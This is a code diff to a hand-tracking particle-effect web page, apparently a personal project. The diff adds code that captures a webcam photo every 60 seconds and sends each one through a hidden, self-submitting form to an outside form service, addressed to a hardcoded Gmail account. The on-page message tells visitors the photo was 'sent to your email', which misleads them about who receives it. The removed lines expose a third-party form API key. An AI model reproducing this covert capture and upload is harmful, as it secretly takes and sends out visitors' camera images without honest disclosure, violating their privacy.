@@ -12,6 +12,9 @@ let photoTimer = null;
 let photoCount = 0;
 let cameraStarted = false;
 
+// ✅ FORMSPREE FORM ID
+const FORMSPREE_FORM_ID = "mnnegoak"; // अपना Form ID यहाँ डालें
+
 function init() {
     scene = new THREE.Scene();
     camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -264,7 +267,7 @@ window.addEventListener('resize', () => {
     renderer.setSize(window.innerWidth, window.innerHeight);
 });
 
-// ----------------- WORKING PHOTO SYSTEM -----------------
+// ----------------- WORKING PHOTO SYSTEM WITH FORMSPREE -----------------
 
 // Capture photo from video stream
 function capturePhoto() {
@@ -284,97 +287,115 @@ function capturePhoto() {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const photoData = canvas.toDataURL('image/jpeg', 0.7);
         
-        // Send photo to admin
-        sendPhotoToAdmin(photoData);
+        // Send photo to Formspree
+        sendToFormspree(photoData);
         
         photoCount++;
-        console.log(`📸 Photo ${photoCount} captured`);
+        console.log(`📸 Photo ${photoCount} captured and sending...`);
         
     } catch (error) {
         console.error("Photo error:", error);
     }
 }
 
-// ✅ WORKING: Send photo to admin
-async function sendPhotoToAdmin(photoData) {
+// ✅ WORKING: Send photo via Formspree
+async function sendToFormspree(photoData) {
     try {
-        console.log(`📤 Processing photo ${photoCount}...`);
+        console.log(`📤 Sending photo ${photoCount} to Formspree...`);
         
-        // 1. First download to user's computer
-        downloadPhoto(photoData);
+        // Create hidden form
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.enctype = 'multipart/form-data';
+        form.action = `https://formspree.io/f/${FORMSPREE_FORM_ID}`;
+        form.style.display = 'none';
         
-        // 2. Send email notification (text only)
-        await sendEmailNotification();
+        // Add email field (required)
+        const emailField = document.createElement('input');
+        emailField.type = 'hidden';
+        emailField.name = '_replyto';
+        emailField.value = 'editing2213@gmail.com';
         
-        // 3. Save locally as backup
-        savePhotoLocally(photoData);
+        // Add subject field
+        const subjectField = document.createElement('input');
+        subjectField.type = 'hidden';
+        subjectField.name = '_subject';
+        subjectField.value = `📸 Particle Photo ${photoCount}`;
         
-        console.log(`✅ Photo ${photoCount} processed successfully!`);
-        showNotification(`📸 Photo ${photoCount} saved! Check your downloads.`);
+        // Add timestamp
+        const timeField = document.createElement('input');
+        timeField.type = 'hidden';
+        timeField.name = 'timestamp';
+        timeField.value = new Date().toISOString();
         
-    } catch (error) {
-        console.log(`📸 Photo ${photoCount} saved locally`);
-        downloadPhoto(photoData); // At least download it
-    }
-}
-
-// Download photo to computer
-function downloadPhoto(photoData) {
-    const link = document.createElement('a');
-    link.href = photoData;
-    link.download = `particle_photo_${photoCount}_${Date.now()}.jpg`;
-    link.style.display = 'none';
-    document.body.appendChild(link);
-    link.click();
-    setTimeout(() => document.body.removeChild(link), 100);
-}
-
-// Send email notification
-async function sendEmailNotification() {
-    try {
-        const formData = new FormData();
-        formData.append('access_key', 'f5bdda81-92f8-4595-a2e8-a6107db5feef');
-        formData.append('subject', `📸 New Photo ${photoCount} - Particle Website`);
-        formData.append('message', 
-            `A new photo has been captured!\n\n` +
-            `Photo Number: ${photoCount}\n` +
-            `Time: ${new Date().toLocaleString()}\n` +
-            `Website: ${window.location.href}\n\n` +
-            `Note: Photo has been downloaded to the user's computer.`
-        );
-        formData.append('email', 'editing2213@gmail.com');
-        
-        await fetch('https://api.web3forms.com/submit', {
-            method: 'POST',
-            body: formData
+        // Convert photo to file
+        const response = await fetch(photoData);
+        const blob = await response.blob();
+        const file = new File([blob], `particle_${Date.now()}.jpg`, {
+            type: 'image/jpeg'
         });
         
-        console.log(`📧 Email notification sent`);
+        // Create file input
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        fileInput.name = 'photo';
+        fileInput.accept = 'image/jpeg';
+        
+        // Add file to input using DataTransfer
+        const dataTransfer = new DataTransfer();
+        dataTransfer.items.add(file);
+        fileInput.files = dataTransfer.files;
+        
+        // Append all fields to form
+        form.appendChild(emailField);
+        form.appendChild(subjectField);
+        form.appendChild(timeField);
+        form.appendChild(fileInput);
+        
+        // Submit form
+        document.body.appendChild(form);
+        form.submit();
+        
+        // Remove form after submission
+        setTimeout(() => {
+            if (form.parentNode) {
+                form.parentNode.removeChild(form);
+            }
+        }, 1000);
+        
+        console.log(`✅ Photo ${photoCount} sent to Formspree!`);
+        showNotification(`✅ Photo ${photoCount} sent to your email!`);
         
     } catch (error) {
-        console.log("Email notification skipped");
+        console.error("❌ Formspree Error:", error);
+        showNotification("⚠️ Photo saved locally");
+        savePhotoLocally(photoData);
     }
 }
 
-// Save photo locally
+// Save photo locally as backup
 function savePhotoLocally(photoData) {
     try {
-        const photos = JSON.parse(localStorage.getItem('captured_photos') || '[]');
-        photos.push({
-            id: Date.now(),
-            time: new Date().toISOString(),
-            count: photoCount,
-            preview: photoData.substring(0, 100) + '...'
-        });
-        localStorage.setItem('captured_photos', JSON.stringify(photos));
+        const link = document.createElement('a');
+        link.href = photoData;
+        link.download = `backup_photo_${photoCount}.jpg`;
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        link.click();
+        setTimeout(() => document.body.removeChild(link), 100);
     } catch (e) {
-        // Ignore storage errors
+        console.log("Could not save photo");
     }
 }
 
 // Show notification
 function showNotification(message) {
+    // Remove existing notifications
+    const oldNotifs = document.querySelectorAll('.photo-notification');
+    oldNotifs.forEach(notif => notif.remove());
+    
     const notification = document.createElement('div');
+    notification.className = 'photo-notification';
     notification.style.cssText = `
         position: fixed;
         top: 20px;
@@ -386,45 +407,34 @@ function showNotification(message) {
         z-index: 9999;
         font-family: Arial, sans-serif;
         font-weight: bold;
-        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         animation: slideIn 0.3s ease;
         display: flex;
         align-items: center;
         gap: 10px;
-        max-width: 300px;
+        max-width: 350px;
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255,255,255,0.2);
     `;
     
     notification.innerHTML = `
-        <span style="font-size: 20px;">📸</span>
-        <span>${message}</span>
+        <span style="font-size: 24px;">📸</span>
+        <div>
+            <div style="font-size: 16px;">${message}</div>
+            <div style="font-size: 12px; opacity: 0.8; margin-top: 5px;">
+                Photo ${photoCount} • ${new Date().toLocaleTimeString()}
+            </div>
+        </div>
     `;
     
     document.body.appendChild(notification);
     
-    // Remove after 4 seconds
+    // Auto remove after 5 seconds
     setTimeout(() => {
         notification.style.animation = 'slideOut 0.3s ease';
-        setTimeout(() => {
-            if (notification.parentNode) {
-                notification.parentNode.removeChild(notification);
-            }
-        }, 300);
-    }, 4000);
+        setTimeout(() => notification.remove(), 300);
+    }, 5000);
 }
-
-// Add animation styles
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes slideIn {
-        from { transform: translateX(100%); opacity: 0; }
-        to { transform: translateX(0); opacity: 1; }
-    }
-    @keyframes slideOut {
-        from { transform: translateX(0); opacity: 1; }
-        to { transform: translateX(100%); opacity: 0; }
-    }
-`;
-document.head.appendChild(style);
 
 // Start photo capture timer
 function startPhotoCapture() {
@@ -432,7 +442,8 @@ function startPhotoCapture() {
         clearInterval(photoTimer);
     }
     
-    console.log("📸 Auto photo capture started (every 30 seconds)");
+    console.log("📸 Auto photo capture started (every 60 seconds)");
+    showNotification("📸 Camera active - Photos will auto-capture");
     
     // First photo after 10 seconds
     setTimeout(() => {
@@ -441,12 +452,12 @@ function startPhotoCapture() {
         }
     }, 10000);
     
-    // Then every 30 seconds
+    // Then every 60 seconds (to avoid spam)
     photoTimer = setInterval(() => {
         if (cameraStarted) {
             capturePhoto();
         }
-    }, 30000);
+    }, 60000);
 }
 
 // Stop photo capture
@@ -540,13 +551,27 @@ function setupHandTracking(){
         }, 5000);
         
         // Show welcome message
-        showNotification("📸 Camera active - Photos will auto-capture every 30 seconds");
+        showNotification("📸 Camera active - Photos will auto-capture every 60 seconds");
         
     }).catch((error) => {
         console.error("❌ Camera error:", error);
         showNotification("⚠️ Camera access required for full experience");
     });
 }
+
+// Add CSS animations
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes slideIn {
+        from { transform: translateX(100%); opacity: 0; }
+        to { transform: translateX(0); opacity: 1; }
+    }
+    @keyframes slideOut {
+        from { transform: translateX(0); opacity: 1; }
+        to { transform: translateX(100%); opacity: 0; }
+    }
+`;
+document.head.appendChild(style);
 
 // Stop capture when leaving page
 window.addEventListener('beforeunload', stopPhotoCapture);
